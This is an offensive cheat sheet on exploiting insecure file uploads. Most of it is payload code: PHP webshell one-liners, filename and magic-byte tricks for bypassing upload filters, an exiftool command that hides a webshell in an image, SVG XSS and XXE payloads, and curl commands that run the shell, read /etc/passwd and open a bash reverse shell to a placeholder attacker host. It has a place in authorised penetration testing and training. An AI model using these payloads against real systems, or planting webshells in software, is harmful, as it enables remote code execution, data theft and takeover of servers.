# File Upload Attacks

Exploiting insecure file upload functionality to upload malicious files — typically a webshell — for remote code execution.

## Webshell Payloads

```php
<!-- Minimal PHP webshell -->
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>

<!-- With output formatting -->
<?php echo '<pre>' . system($_GET['cmd']) . '</pre>'; ?>
```

## Extension Bypass Techniques

```
# Double extension
shell.php.jpg
shell.php.png

# Case variation
shell.PHP
shell.PhP

# Null byte (older PHP)
shell.php%00.jpg

# Special PHP extensions
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar

# MIME type bypass (change Content-Type in request)
Content-Type: image/jpeg
```

## Magic Bytes Bypass

Add image magic bytes before PHP code to fool MIME checks:

```
# JPEG magic bytes
FF D8 FF E0   followed by PHP payload

# PNG magic bytes
89 50 4E 47

# Using exiftool to inject into real image
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg.php
```

## SVG XSS

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>
```

## XXE via File Upload (DOCX/XLSX)

```xml
<!-- Embed in docx's word/document.xml via zip -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

## After Upload

```bash
# Trigger the shell
curl "http://target/uploads/shell.php?cmd=id"
curl "http://target/uploads/shell.php?cmd=cat+/etc/passwd"

# Upgrade to reverse shell
curl "http://target/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"
```
